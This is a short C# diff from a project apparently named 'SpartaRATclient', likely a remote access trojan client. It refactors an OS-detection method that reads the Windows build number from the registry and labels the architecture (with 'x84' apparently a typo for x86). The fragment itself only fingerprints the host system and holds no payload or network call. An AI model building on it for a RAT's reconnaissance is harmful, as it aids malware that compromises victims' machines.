@@ -5,10 +5,9 @@ namespace SpartaRATclient.Setup.OSType
 {
     public class OSType
     {
-        public string Type()
+        public static string Type()
         {
-            RegistryGet item = new RegistryGet();
-            int osBuild = int.Parse(item.Get(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuildNumber"));
+            int osBuild = int.Parse(RegistryGet.Get(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuildNumber"));
             string Type = Environment.Is64BitOperatingSystem ? "x64" : "x84";
 
             if (osBuild >= 22000)
